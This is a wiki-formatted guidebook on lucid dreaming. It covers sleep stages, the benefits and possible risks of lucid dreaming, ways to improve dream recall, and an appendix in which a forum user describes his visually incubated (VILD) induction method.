There are five stages of sleep: four stages of NREM (Non-REM) sleep, also called SWS (Slow-Wave Sleep), and one stage of REM (Rapid Eye Movement) sleep. The most vivid and remembered dreams occur during REM sleep. Research has shown that a person being woken from REM sleep will account having just been in a dream roughly 80% of the time, while this percentage is 15% during non-REM sleep.&lt;ref&gt;Arno F. Wittig. ''Schaum's outline of theory and problems of introduction to psychology''. McGraw-Hill, 1977. Retrieved from [http://books.google.ca/books?id=P2WjBpHq9IcC&amp;lpg=PP1&amp;dq=schaum's%20outline%20of%20theory%20and%20problems%20of%20introduction%20to%20psychology&amp;pg=PP1#v=onepage&amp;q=&amp;f=false Google Books] on September 23, 2009.&lt;/ref&gt;  One sleep cycle is roughly 90 minutes long.
* ''(NREM 1)'' The first stage is a transition state between wakefulness and sleep. This is the stage in which [[w:Hypnagogia|hypnagogic]] imagery occurs. It usually passes into stage 2 within a few minutes.
* ''(NREM 2)'' During stage 2, the body gradually shuts down, and brain waves become longer in wavelength.
* ''(NREM 3)'' Stage 3 usually occurs 30 to 45 minutes after falling asleep the first time. Large, slow delta brain waves are generated.
* ''(NREM 4)'' Stage 4 is often called “deep sleep” or “delta sleep”. The heart beats the slowest and there is the least brain activity. It is during this stage that sleepwalking usually occurs.
* After stage 4, the NREM stages reverse and move back to stage 2, and then into REM sleep.
* ''(REM)'' During REM sleep, some parts of the brain are nearly as active as while awake. In this stage, your eyes flicker rapidly (hence the acronym Rapid Eye Movement). Your body is paralyzed, preventing the body from acting out dreams.&lt;ref&gt;Rochelle Merilien. ''Sleep Paralysis''. Retrieved September 21, 2009 from [http://serendip.brynmawr.edu/biology/b103/f03/web2/rmerilien.html]&lt;/ref&gt;

After the REM state, you sometimes wake briefly. This is usually forgotten by the time you wake up in the morning. If you don't wake up, you go to stage 2.

'''I never dream anyway.'''

Actually, everyone has dreams — but some people simply don’t remember them. In the next chapter, you will find out how to improve your dream recall.

'''Why do we dream? What do dreams mean?'''

These questions are outside the scope of this book, but you can find several hypotheses in the [[W:Dream interpretation|Wikipedia article on dream interpretation]].

==About lucid dreaming==
Lucid dreaming is simply being aware that you are dreaming. With enough experience, you can increase control over your dreams &amp;mdash; anything from flying to creating people and places, and even changing into animals. Having a lucid dream is like being the director of your own movie!
A passage from the fantasy novel  ''Harry Potter and the Deathly Hallows'' (chapter at King's Cross) that may explain what this looks like:

&lt;code&gt;&quot;For the first time, he wished he were clothed. Barely had the wish formed in his head than robes appeared a short distance away.&quot;&lt;/code&gt;

Lucid dreams have been scientifically proven to exist. Stephen LaBerge of [http://www.lucidity.com The Lucidity Institute] used a special machine to track eye movements during a dream (these are linked to your eye movements within the dream). He asked lucid dreamers to point their eyes left and right in quick succession once they became &quot;conscious&quot; in their dreams, and this movement was recorded on the machine. For more information on this and other experiments, read ''Exploring the World of Lucid Dreaming'' (ISBN in [[Lucid Dreaming/Further Reading#In print|Further Reading]]).

There are plenty of reasons you might want to dream lucidly:
* For '''fun'''! Just flying in a lucid dream is an exhilarating feeling. Lucid dreams are generally far more intense and vivid than most non-lucid dreams. You can use a lucid dream to wind down after a long day.
* Transforming into animals or getting superpowers is a '''unique experience''' that is hard to get any other way.
* If you are particularly interested in dreams &amp;mdash; either spiritually or psychologically &amp;mdash; trying lucid dreaming could help you in your research.
* If you're writing fiction or even '''creating''' a world for a computer game, lucid dreaming can help you visualize it. You could ask your characters how they feel about something or what they think will happen.
* Some people compose music in their lucid dreams.
* Lucid dreams can be realistic enough to '''rehearse''' a speech or musical performance.
* You can '''relive''' previous dreams or experiences.
* They can help in '''dream interpretation''' and '''communicating with your subconscious'''.


'''I can’t control my dreams.'''

This is very rarely actually the case (though sometimes it is in nightmares). Usually it is just your memory which treats you as though it were beyond your control. If you become lucid in a dream where you have a body, you will almost always be able to control your body. However, you might not manage to do anything else. Don't worry, though &amp;mdash; most people have no problem with jumping very high or flying in a lucid dream!

On the other hand, parts of your brain are less active while dreaming, which can lead to dream/trance logic and sometimes choices you will later regret. For example, you might choose to continue your lucid dream, although you know that once you wake you will only remember half of it. Once you wake up, you may wish that you had stopped your dream. Another example is of somebody who dreamt they were sitting next to Mother Theresa. They wondered if they might be dreaming, thinking ''isn’t Mother Theresa dead?'' They then concluded that she was obviously right next to them and therefore alive, and that it wasn’t a dream!

'''Are lucid dreams related to [[w:Parapsychology|psi phenomena]]?'''

There are differing views on this. Some people claim to have organized shared dreams or precognitive dreams through lucid dreaming. Others say these are simply created in the brain like any other dream, something like self-hypnosis.

'''How long does it take to learn how to dream lucidly?'''

This completely depends on the person and circumstances. Some people have a lucid dream after just a few nights of learning about it, while for others, it may take months! If you don't get enough sleep or feel too stressed after work to regularly practice induction techniques, then it may take a long time, especially if you expect it to. It will also depend on how much effort you put in. However, ''everybody'' has the ability to dream lucidly.

'''I think I do this naturally. Does this happen?'''

It is quite rare to have regular lucid dreams naturally, although most people have had a lucid dream at some point in their lives. If you want to increase the frequency of your lucid dreams, carry on reading through the book; otherwise, skip to the [[Lucid Dreaming/Using|Using]] section to get some ideas for your dreams.

'''I had [a dream], was I lucid?'''

In general, a lucid dream is defined as a dream in which you know you are dreaming at some point, regardless of anything else. Even if you were lucid one second but lost your lucidity, it is still technically a lucid dream.

However, this can be a little misleading. Sometimes you dream that you fall asleep and have a lucid dream! This is often thought of as a sign that you will have a proper lucid dream soon, as your mind is thinking a lot about lucid dreams.

Try using this table:
{|
!width=&quot;50%&quot;|Signs you were lucid
!width=&quot;50%&quot;|Signs you weren't lucid
|-
|valign=&quot;top&quot;|
* Doing a reality check which gave a positive result
* Attempting to stabilize the dream (see the [[Lucid Dreaming/Using#Dream stabilization|Using]] chapter)
* Attempting to fly, walk through mirrors, etc. immediately after realizing you are dreaming
* Waking up as soon as you realize that you are dreaming
* Remarks to dream characters that you are dreaming
|valign=&quot;top&quot;|
* Dreaming that you were dreaming
* Having an unusually poor recall for that dream after you became lucid
* Not recognizing illogical parts of the dream as a dream
* Attempting to fly, walk through mirrors, etc. without success
* Treating dream characters as you would real people*
|}

&lt;nowiki&gt;*&lt;/nowiki&gt; However, some people may have lucid dreams and deliberately choose to treat dream characters as if they were real. In fact, it can be intriguing to have real conversations with dream characters, such as physics or philosophy discussions - you may discover they know more than you do!

==Possible dangers of lucid dreaming==

There is no current evidence of lucid dreaming being abnormal or unhealthy in any way. However, there may be some more or less minor side effects associated with having lucid dreams. Please don’t let this scare you away from trying this; rather, remember that with dreams you are dealing with your own subconscious mind and recklessness is not recommended.

===Alienation===

Most people have never even heard of lucid dreaming, much less ever experienced it. Some people are also less than open-minded and receptive to new ideas. Don’t be surprised if someone considers this whole phenomenon “weird” or “crazy” (which it is not). Don’t preach, either; you don't have to convince anybody.

Often people who spontaneously lucid dream, especially children, may find it surprising that not everyone does. They may even start thinking that they are the only people in the world who have lucid dreams. If they’re worried, the best support is to let them know that they’re not alone.

=== Dissociation ===

Lucid dreaming may weaken the borders between waking and dreaming, the conscious and subconscious mind, reality and fantasy. This might lead to problems of a dissociative nature. Probably the most common form of dissociation involves having problems distinguishing your waking memories from dream memories. Everyone who recalls at least one dream will have to sort out their dreams from reality in the morning. This can really be a problem for those who have previously had zero recall and, due to lucid dreaming, have had a major uptick in recall. Now, suddenly, they have all these excess, illogical memories to sort out. '''This is unlikely to be a major problem''', but may be a big annoyance. An example is when you have actually misplaced an item, and &quot;find it&quot; in a dream. If you cannot distinguish dream from reality you will now think you know where that item is, perhaps even placed it where you felt sure to find it later, but when you awake it will not be there.

However, there are signs that you should watch for which indicate a larger problem may be developing. Lucid dreaming in itself should not cause these to appear ''in a waking state'':
* Ability to ignore extreme pain or what would normally cause extreme pain
* Absorption in a computer game, television program or movie
* Remembering the past so vividly one seems to be reliving it
* Finding evidence of having done things one can’t remember doing
* Not remembering important events in one’s life
* Being in a familiar place but finding it unfamiliar
* Seeing oneself as if looking at another person
* Other people and objects do not seem real
* Looking at the world through a fog or haze
* Not recognizing friends or family members
* Finding unfamiliar things among one’s belongings
* Finding oneself in a place but unaware of how one got there
* Finding oneself dressed in clothes one doesn’t remember putting on

If this has happened, and there is no other cause (e.g. drugs), take a break from lucid dreaming for a while. In fact, take a break from anything fictional for a while, at least until symptoms stop. In addition, you may consider avoiding experimentation with lucid dreaming if you have a mental condition that will alter your perception of reality, eg. Schizophrenia, Hallucinations, Dementia

===False awakenings===

One of the advantages of having lucid dreams is being able to change a dream or wake up if things are not turning out as planned. A false awakening is when you seem to have woken up but are actually still dreaming. For example, you may find yourself waking up in your room. But once there, new things will start happening—for example, someone might visit, or you might wander outside because of an odd noise, or there might be objects all over the place. There are no such things as loops of awakenings. You can simply shock your body awake by applying a stimulus in your dream. It's a good idea to get in the habit of doing a reality check just after waking up so that you'll realize when this happens and become lucid.

When this happens repeatedly in the same night, it can be very tiring and often frightening. Not only can the belief of being fully awake in your room while being exposed to unusual situations be scary, but you also may start fearing you won't be able to actually wake up. And, depending on the content of the dream, since all your dreams tend to start in your room, you may fear what could happen once you actually do wake up.

But this is not a very common situation. Once you are lucid, it is usually easier to wake up or lose the dream than it is to keep dreaming.

PLEASE NOTE: The following possibilities are controversial and have not been proven.

===Controversial: Accidentally encountering “spiritual” entities===

This depends on your worldview. If dreams are a creation of your brain and nothing more, you don’t need to worry about spirits or anything similar. If you want to be on the safe side, treating objects in your dream decently and politely won’t do you any harm.

The book &quot;The Art of Dreaming&quot; by Carlos Castaneda has a lot to say on this subject. (See [[Lucid Dreaming/Further Reading|Further Reading]])

===Controversial: Creating bad habits or becoming a control freak===

When lucid dreaming, you have the option to control the dream world in ways that are impossible in the waking world. You can, for example, make objects appear or disappear, or make people act according to your will. Some people believe this may lead your subconscious to desire this kind of control in the waking world, where it’s highly inappropriate. Also, you might be tempted to apply dream-world solutions to waking-life problems instead of actually facing them; for example, just willing bad things to go away or escaping or destroying them by superpowers. Again, this is probably more of a problem if you are not mentally stable at the outset of your dreaming process.

===Controversial: Exhaustion===

Some people believe that experiencing many artificially induced lucid dreams often enough can be very exhausting. The main reason for this phenomenon is the result of the lucid dreams expanding the length of time between REM states. With fewer REMs per night, this state in which you experience actual sleep and your body recovers becomes infrequent enough to become a problem. This is just as exhausting as if you were to wake up every twenty or thirty minutes and watch TV. The effect is dependent on how often your brain attempts to lucidly dream per night. If you enter into a routine of attempting to lucidly dream, you may cause recursive lucid dreams that occur at each state change.

===Controversial: Inability to stop===

If you have trained your mind to the point where it can step over the boundary without conscious effort, you might find it difficult to stop. Do not become alarmed if you have trouble stopping the process of lucid dreaming, it is possible to get out of the habit. As long as you truly expect to stop having lucid dreams regularly, you will. You just need to stop any further attempts to lucid dream, and within a few months the lucid dreaming will go away by itself. Remember; do not be alarmed if, even with your attempts to stop, you experience further lucid dreams. It might take a while to break the habit. If you have real concerns, it may be advisable to talk with your doctor or therapist regarding appropriate treatment, including medication.

==Similar techniques==

'''I can do astral projection, should I learn how to dream lucidly?'''

Possibly not. If you often enter a “dream world” after having the experience of leaving your body, that is basically the same as the method called [[Lucid Dreaming/Induction Techniques#WILD|Wake-Initiation of Lucid Dreams]]. Keep in mind that many people believe that “astral projection” or “out-of-body experiences” are actually lucid dreams. Whether these are real [[w:Parapsychology|psi phenomena]] or the creative product of your dreaming mind, learning to dream lucidly will expand the variety of your experiences.

'''If this is so similar, why learn lucid dreaming and not astral projection?'''

Here are some reasons:
* Lucid dreaming is something that everybody can understand. In fact, most people have already had a lucid dream. No single theory about astral projection is accepted even in the astral projection community.
* If you are prepared to spend money, there are some gadgets that can help induce lucid dreams. They usually emit light or sound signals shortly after the REM state is detected. Hypnosis tapes usually focus more on self-improvement and you cannot decide what to do with your hypnotic trance.
* If you don’t believe in [[w:Parapsychology|psi phenomena]], you will likely be much more comfortable reading books about lucid dreaming than those on astral projection.  If you have to keep stopping and thinking &quot;but that's not possible&quot;, there's always the danger that your feelings of skepticism will affect the way you think about lucid dreaming and make it much harder for you to do.
* You would be sleeping anyway, so it doesn't take up waking time.
* You'll be able to use this Wikibook to your advantage!

It is essential to improve your dream recall. There are at least two reasons for this:

: 
# While it is very rare, it ''is'' possible to forget about a lucid dream. It would be meaningless to invest so much effort into lucid dreaming, only to forget about it upon waking.
# Recording your dreams will eventually allow you to start recognizing recurring patterns, characters, and scenarios. Having these details will be invaluable once you begin practicing lucid dream induction techniques.

While asleep, we experience a period of REM sleep approximately every 90 minutes. It is during this time that we typically dream.  These periods are initially very brief – only around 10 minutes. But as the night progresses, these periods become increasingly longer - often stretching to over 45 minutes at a time. Waking up in the midst of dreaming dramatically increases your ability to remember the details of the dream. Therefore, try setting an alarm clock to 4½, 6, or 7½ hours after you normally fall asleep. This should awaken you directly from a dream.

The most important part of improving your dream recall is keeping a dream journal (or a dream diary). Virtually any medium will do;  an office notebook, artist’s sketchpad, an online journal, a sheet of paper, or even a Dictaphone &amp;mdash; whatever is easiest for you. Here are some guidelines for keeping your journal:
* '''Write all your dreams and only your dreams'''
** Write down ''everything'' you can possibly remember about the dream. Phrases, colors, feelings...everything. Record them as soon as you wake up.
** Sketch pictures into your notebook to help you remember symbols, places, faces, and other visual dream elements.
** If you wake in the night and have trouble waking up enough to record a dream you can use the mnemonic technique recommended in Harry Lorayne and Jerry Lucas's &quot;The Memory Book&quot; of changing something in your room, for example, knocking something onto the floor, and associating that with an image from your dream. On waking the displaced object should trigger your memory of the image and so make it easier for you to remember the dream.
* '''Ritualise your diary'''
** Using a dedicated pen in a special color helps to make keeping your journal more of a ritual.
** You might want to copy out rough notes into a neater dream diary later on in the day. This helps ingrain the dream in your mind.
* '''Recall as much as you can while still lying in bed'''
** Go to bed early to ensure that you wake a while before you start your day. In this free time, mull over any dreams you had and do a [[Lucid Dreaming/Induction Techniques#Reality checks|reality check]].
** You may want to keep your eyes closed for as long as possible, particularly if you wake up near the sunrise. Try to use a notebook which holds a pen and scribble down whatever you can with your eyes still closed.
** Stay in the same position and run your dreams over in your head a few times before arising from bed. After you have remembered your dream, move to a different position (with your eyes still closed) that you normally sleep in, then recall your dream. The position that you are in may help your brain remember what dream you had while sleeping in that position.
** If you are still unable to remember anything, allow your mind to wander through events of yesterday or through any issues you have been thinking about. These may help to trigger details of your dreams..
** If you share a bed with a partner, make a habit of exchanging dreams upon waking before talking about anything else.
* '''Be prepared to record dreams throughout the day'''
** Keep a small dream diary notebook with you all the time. It is quite easy to remember a dream in the day and then forget it by the time you get home.
** Even if you only get a fleeting feeling of some dream during the day, note down as much as you can remember about the dream and what triggered the memory.
** Think about your dream or dreams throughout the day, and ask yourself “What did I dream?” several times. Often, you only get a good answer to this an hour after you woke up.
* You can try to remember your dream by “back-tracking” &amp;mdash; start from the moment when you wake up, and try to remember what you were doing before that. You may even be able to reconstruct your dream to the beginning.
* If you find that many of your dreams are about certain items, such as cars and painting, then, if you cannot remember your dream in the morning, think about whether it contained your specific dream signs, in this case, cars and painting. You can even make a “dream lexicon” &amp;mdash; a piece of paper with common dream items written on it, so you can read it every time you wake up.

Also, use the [[Lucid Dreaming/Induction Techniques#Autosuggestion|autosuggestion technique]] to improve your dream recall (see the full description of the autosuggestion technique in the next chapter).

Once you have a lot of dreams in your diary, you can start looking through it for dream signs. Some dream signs are commonly experienced by many people. These include things like flying, being chased, chasing something, or being in an old house. However, a number of signs will be unique to you. These unique signs may involve meeting with significant people (from your life), being at your job, or talking with passed away relatives.

Stay alert to any of your dream signs appearing within in real life. And when they happen, always perform a [[Lucid Dreaming/Induction Techniques#Reality checks|reality check]] to determine if you are dreaming.

'''I sometimes remember more dreams than the time I was asleep could allow. How is this possible?'''

You may have had several dream scenes within a single dream period or some memories could be from past nights.

It is also possible that dream time doesn't strictly correspond to real time.  Days may pass in a dream during a single night's sleep. Dreams which seem to last for hours while you have them have sometimes been found to actually have a duration of only a few minutes.  There have been accounts of people having lucid dreams lasting years:  Robert Monroe reported having a lucid dream that lasted a hundred years. [http://www.web-us.com/lucid/luciddreamingFAQ.htm#How%20can%20I%20stop%20real%20time%20in%20my%20Lucid%20Dreams?]

You might also be having a memory that was not an actual dream, but rather a waking memory mistakenly related with dream memories instead of being properly related with waking memories. Thus, these memories might not be dreams from the past, but rather ongoing subconscious experiences.

'''In what order should I write my dreams?'''

It is usually very hard to tell if the dreams you dreamt happened in the order you recalled them. Generally they are written in the order remembered, though others may prefer to write them in a completely random order. Find what works for you.  If you dream that you told somebody about a previous dream that happened the same night, then that previous dream probably came before the other one (though the “previous dream” could have been a false memory). The important thing is to write the dream down. Later, if you can recall the order of the dreams, just go back into your diary and rearrange them.

This is the most recent full description of the VILD technique by its creator, Peter Harrison (Pedro on the LD4ALL.com forums), with a TOC.

__NOEDITSECTION__

==Visually Incubated Lucid Dream==
OK guys, Pedro here. VILD is the method I use to induce lucid dreams and in this document I will do my best to describe how the method is used.

I have practiced and refined different ideas and techniques to come up with the best possible method for me to become lucid and I can now induce a lucid dream at will. I call it VILD . Hopefully you will also be able to use my method either directly or by taking parts from it to create an induction technique which may work better for you.

A few things before I go onto the VILD method...

===Mind Model===
First thing is first though......I tried explaining this method to some friends who try to lucid dream and I was shocked to discover they knew nothing of the &quot;mind model&quot;! I think anyone (using my method or not) should understand the mind model to achieve lucid dreams! Please read and understand this next section as it will greatly aid you in having lucid dreams!

You. I am going to talk about YOU. I want you to understand (if you do not already) that YOU cannot see. YOU cannot hear. YOU cannot taste. YOU also can't feel anything. I'll take sight for this example:

YOU do not see because it's your EYES that see. You are only your mind, you are your brain. This might seem strange but keep reading. Imagine there is a tree in front of you. YOU cannot see the tree but your eyes do. Your eyes see the tree first hand and the vision they see is totally 100% pure! The eyes then turn this pure image into DATA and send it to you! You do not see, it is your eyes that see. When you stand in front of a tree you think you can see it and the rest of the world, but the tree you see is only a model based on reality. Your mind takes all the information and data it can from the senses and creates a model of the world. This &quot;mind model&quot; is how you experience your world. Technically one of your senses could make a mistake or send some kind of corrupted data and the world you see would actually be different from the REAL world, but this is almost never the case. I hope you understood that...

A good example to back this up is radio waves! We have instruments that detect light (eyes) and instruments that detect sound waves (ears) so our mind model has these elements in the model. We do not have instruments that detect radio waves, we have no sense to interpret them or even show they exist. Therefore, we see no radio waves shooting around in our world! They are there in the real physical world. The radio waves are there as much as the trees are or the sound of your voice. They are not in our mind model though as we have no sense that detects them so they are not used to construct our mind model!

Now here is where dreaming comes in.... You experience your world in the same way when you are dreaming. The only difference is that your mind doesn't receive many signals from your senses when you are asleep. This lack of external information is countered by creating the mind model from mostly INTERNAL information such as wishes and memories. This is how a dream is created!

Now I hope you understand that, even in real life, the world you are experiencing is not actually the real world but a model of the world which is created in your mind. If you know this information when attempting lucid dreams it should help a lot.

Throughout the day you should stop and think about the world around you. Think about everything you can possibly tell about the world at that moment. Sight, sound, touch and think about how everything you experience is a model of the physical world. Think hard about it for a couple of minutes. Now on to another thing you should do a lot during the day...

===Reality Checks===
I'm sure everyone reading this knows that a Reality Check is an action used to determine whether the world around us is real or a dream. I would like to recommend two reality checks which always work with me and do not rely on any object or other character in a dream. (Plus these ones don't make you look stupid if testing while in real life!).

#Close one eye and try to look at your nose with your open eye. If you can see your nose then you are awake. If you cannot then you are asleep. Whether a reality check turns out positive or negative you should ALWAYS perform a backup one just incase. No matter how sure you are of the results from the last check. After you've checked to see your nose you should try this:
#Hold your nose tight and try to breathe through it. If you can you are certainly dreaming.

===VILD Induction===
VILD is my own method. It came about when I discovered I could incubate dreams of my choice. Incubation is when you go to sleep aiming to have a certain dream and &quot;incubating&quot; this dream in a way that you eventually go into the desired dream. Before I explain how I incubate dreams I will go through the rest of the method in brief. After I've went through the whole method briefly I will then describe the whole method part-by-part in detail.

==== In Brief ====
After a discussion on the LD4all.com forum I discovered how I could use my incubated dreams to get me lucid. I was told that I could incubate a dream where I was forced to do a Reality Check. I managed to design a dream where I would always remember to perform a Reality Check. This dream is the dream I would then incubate from now on and it has had a 100% success rate with me so far.

I enter the dream, do the reality check, and become lucid.

===VILD Method In Full===
Okay, this will be a long section so I will split it up slightly. I have split the VILD method into the following three sections:
* [[Lucid Dreaming/Appendices/VILD#Preparation|Preparation]]
* [[Lucid Dreaming/Appendices/VILD#Incubation|Incubation]]
* [[Lucid Dreaming/Appendices/VILD#Once you are lucid|Once you are lucid]]

====Preparation====
The key points in the preparation of VILD are:
#To have a dream designed early on and to keep to this dream no matter what.
#The correct times and actions when going to bed and when going to sleep.

Firstly you need a dream ready to incubate right now. After this next paragraph I would like you to sit and plan the dream out exactly. When I say dream I actually mean a dream &quot;situation&quot;. This is the exact dream I incubate every single night, hopefully this will make a good example:

&lt;blockquote&gt;&quot;I am in a room. The room is a normal shape and is totally bare and empty. The only details about the room are the fact that it is painted a dark red and that there is a door. I am in this room and so are two of best friends, A and C. They both come running up to me and say &quot;Do a reality check! This is a Reality Check competition!&quot; over and over again. I then agree and I close one eye and look for my nose and I cannot see it. I tell them that I might be dreaming. I then try holding my nose and checking if I can breathe or not. I find I can breathe quite easily and I look at my friends and say &quot;I am dreaming!&quot;. My friends look at me with pleased faces and I head for the door in the room.&quot;&lt;/blockquote&gt;

This is the dream situation which I use. Your dream can be like this one or totally different, that is your choice. Pick whatever is comfortable for you, if mine sounds good then use it by all means! BUT take note:

Don't plan the whole dream, only this situation. Don't make an end for the dream or any kind of plot change. Keep it simple! Think of it as a small part before a proper dream rather than designing a whole dream.

Make sure that the same characters (I use 2 friends) and in the dream every time and that they always do and say the exact same stuff each time. Keep it constant!

Also keep YOUR reactions constant! Always see yourself doing and saying the same things just as you do with the other characters. Keep everything the same order every time!

The idea is that you will have this dream so planned that you know EXACTLY where everyone is located, what they say, what they do and how they act. This means that each time you imagine the dream it should be the exact same. No changes...EVER! Please take the time to plan it now. If you do decide to plan it later could you please come back and read this again incase you forget a key point when planning! I really think you should do it now.....NOW DAMN IT!

Next part of the PREPARATION is what you should do leading up to going to bed.

This may seem vague but the best time to go to bed is not too late but not too early. OK, perhaps I should go into more detail there! Do not go any earlier than is natural for you. Any earlier than you usually go to bed and you will have trouble getting to sleep and you will be too awake for VILD to work. You need to go to bed when you are feeling tired but do not overdo it! Don't go to bed at about 4.00am or something stupid! I recommend getting into bed at about 11pm personally. If you are someone who goes to sleep very early then maybe 10pm or 10.30pm would be better. Try to get into bed before midnight though.

Sometime before you have went to bed you should have had a little something to eat and washed it down with a drink. You should then go to the toilet as this is a major cause of waking up from dreams! Make sure there is a good time gap between drinking and using the toilet. If you choose to go to bed at 11pm then you should eat and drink at 10pm. Eat and drink whatever you would usually have at this time of the night, don't change drastically as it can disrupt your sleep.

I'm going to assume that everyone chooses to go bed at 11pm. This is what I do when using VILD...

Get into bed at 11pm and have a lamp or some kind of light source beside your bed. Also keep your dream journal and your pen/pencil handy. (BY THE WAY: Write using a weird colour in your dream journal and never use that colour anywhere else....try it out...). Turn the main bedroom lights out and turn the lamp on. Now you should read a book for about an hour. I say an hour because after an hour I am usually having some difficulty keeping my eyes open and find it hard to read. If you get like this after half an hour it should still be fine. Push yourself to read an extra 10 minutes to insure you are pretty damn tired. Now put the book down and turn of the lamp. Make sure you do not need to get up to turn the lamp on or off. This is so you don't make any movements that can get you more awake and this is also why you shouldn't use the bedroom lights! Lie down and relax in darkness...

TIP: Read a book about lucid dreaming if you can get one! This is the best choice of book although any book will do essentially as it is only to get you tired but keep your brain fairly active. The reason a lucid dreaming book would be good is that if you have just read things about lucid dreaming they stay with you. So even if you do not directly think about anything you read when you go to sleep you probably do subconsciously. It is good to have these thoughts of lucid dreaming in your head even if your not thinking about them, this is also why I mentioned the &quot;Mind Model&quot; as having this knowledge in your head will greatly increase your chances of becoming lucid.

Whenever I read about lucid dreaming and relaxation I see MILLIONS of different positions to lie in. Forget them and also forget about positions altogether! The more you think about how you are lying it keeps your UNrelaxed! Just lie any way you want and just basically do what you usually do. Changing your position in bed from its normal one can disrupt sleep. Just get in the bed and r e l a x.......

Some techniques for relaxation are crap and some are truly helpful. Try downloading some relaxation/hypnosis sound files from the net. Some are not very good but I've found some great ones. Try warpmymind.com for a couple of really relaxing files! A good method is the one where you start from your toes are work your way up. What you do is you tense the muscles in that certain part fop the body your working on. You tense for about 30 seconds and then you just stop and let the body part relax. Feel it get heavy then work your way up to the next limb or body part. When you reach your head sit and focus on the point between your eyes in the middle of your head. Imagine it getting emptier and emptier while you get more and more relaxed and sleepy. You will feel very heavy.

====Incubation====
This is the process for actually incubating your pre-designed dream which you hopefully will have practiced thinking about during the day. Remember...keep it EXACT!

When you feel sufficiently relaxed you should be ready to begin straight away. Hopefully you will be starting to feel sleepy by now after that book read! This is perfect as the technique for incubation requires you to think of nothing else other than your dream. If you are not tired at all and you'll be awake for several hours it could be disastrous! Who could think about their dream EXACTLY over and over again for hours!? Not me anyway! So hopefully you will be near sleep...

Close your eyes. You should be tired enough to have your eyes closed no matter what anyway! Now think of the dream as you did earlier. Think about it happening around you. Whenever you get through it you must start again straight away. Keep thinking about it. After a couple of time try &quot;seeing&quot; the dream. Imagine the dream happening right before your eyes. Remember your eyes should be closed. You should start to see shapes or at least still images from your dream. This should be like daydreaming, try to see the dream moving and alive in front of you. Remember to keep the dream CONSTANT every time!

Try not to see yourself in your dream, see the dream through your eyes just as you would if you were in the dream. Don't go too far in your thoughts...Once you discover you are lucid and tell your friends you should then start over. Don't think about what happens next except you head for the door perhaps. This isn't important because you will be lucid by then in your dream and not need to remember to use the door!

If you notice yourself thinking of ANYTHING else, other than the dream, you must forget about the thought and just let it go. Don't think about a thought! Don't answer any of them. Ignore it and think even harder on the dream when this happens.

Be patient, don't think &quot;ah I don't feel like I'm about to dream or sleep, I'll leave it for a while&quot;. Once your finished your dream situation just rethink it. Over and over and over and over and over!

You will not realize the transition between these thoughts and the actual dream.....but eventually you will enter the dream...

At the time you will just think you are still just imagining your thoughts and then suddenly you will do the Reality Checks and you REALLY will be dreaming!!! How strange! Now head out that door, after thanking your friends of course!

===Once you are lucid===
Now that you are lucid you can do whatever you like. My VILD method stops now and this is technically the end of the document but I would like to comment on some techniques I have discovered through experiments in my dreams. These are all for use once you are lucid.

====Shortcuts====
A shortcut is a little technique I've developed and I accidentally titled it a &quot;shortcut&quot; when describing it to a friend and the name has stuck. There are different levels of lucidity and some people can start very lucid and other have trouble. Absolute lucidity is the state I have reached where I can literally do ANYTHING. Full stop. Some people become lucid but not fully lucid, this is what I used to be like. For example you may be able to fly and walk through walls which is impressive but if asked to create a house from nothing, right in front of you, you may have problems. This would be because you do not have full control yet. A shortcut is something that skips needing to have full control which doesn't seem to improve you but it does in the end......I think an example is needed here:

You cannot fly. You are lucid though and you can do other things but flying is too hard. Even though it's all in your head you just can't take off! Instead of just trying to fly you should take a different approach....try creating a jetpack! Or a rucksack with wings! Anything that would give you flight. Now you can fly! This is what I call a shortcut. These shortcuts seem to make matters worse because they do not improve overall control. They just make the task easier. But this is not true! You just need to do one more thing which you have done before....become aware!.....

You become lucid by becoming aware that you are in a dream and that nothing in your world is real. This sudden awareness is needed again once your up there flying around with your jetpack on. Become aware that the jetpack is not real. It does not exist and is only another part of your mind! Therefore, you don't really need it at all to fly! You can fly yourself as the jetpack was never really there!

Shortcuts allow you to achieve what you want and they can also be used to get more fuller control in the long run!

Shortcuts could be used for many things! Having trouble creating people? Draw pictures of them on a magic scrapbook so they appear! Having trouble morphing or body swapping? Use a magic body swaping kiss or a sex change gun or anything your imagination can think of!

====Prolonging your lucidity====
Spinning is known to be the best method for prolonging lucidity. I do not think it is the best but I do believe it is the best out of all the common techniques. The reason it works is because you feel yourself in the world around you. Spinning gives you multiple impressions that you really are in the world you believe you are. You can feel the air, you can see different angles of the world quickly and you can feel yourself change position in the world. This brings dreams back when they fade. Other techniques work better though....it all depends on the person dreaming! Any technique which makes you &quot;feel&quot; and gives you proof that you are a part of the complex world around you will work. Spinning, jumping and touching the ground, clapping your hands as you spin and also rubbing your hands together are good ones. Don't just rub your hands together...rub them on the wall or floor and FEEL the textures!

I had some other things to talk about when you are lucid but I'm tired now and can't be bothered.

Okay, I hope this was of some use to someone out there! This whole document took me just less than an hour to write and it wasn't planned or anything! I just wrote it all now! I am planning on making a website where I can describe the method in the most detailed way possible except that will take planning and time. So until then I hope this quick document is enough information and I hope I didn't just waste an hour for nothing!

Thanks for reading (if you did).

I hope you do actually read it! (If you didn't).

Pedro.

Or Peter Harrison if anyone cares!

P.S.
VILD is copyright (C) Peter Harrison 2003 lol....hmm maybe not

==Questions answered by Pedro==
'''Something doesn't seem to make sense; when you go to sleep at evening, your body goes through some stages before entering REM mode. So why do you claim that you immediately enter your dream after visualizing that dream scene?'''

I'm sure you don't ''remember'' any of the other sleep periods... you have no recollection of the periods between RL and dreaming. So it seems immediate. I'm thinking of my dream scene over and over and suddenly I realize that this time I'm not just imagining it! I'm in the dream - how strange...

'''Let's say I do VILD and eventually I do end up in the dream. How am I supposed to know that it is a dream and I am not just imagining the scene again?'''

It might not make much sense just now but if it works you'll see that there is a difference. When you get in the dream you are actually ''in'' your scene rather than just visualizing it. You do realize this but you don't really since you aren't lucid and your goin with the flow. As soon as you do the reality checks you become lucid. I promise you won't still think your imagining it. It's a totally different experience.

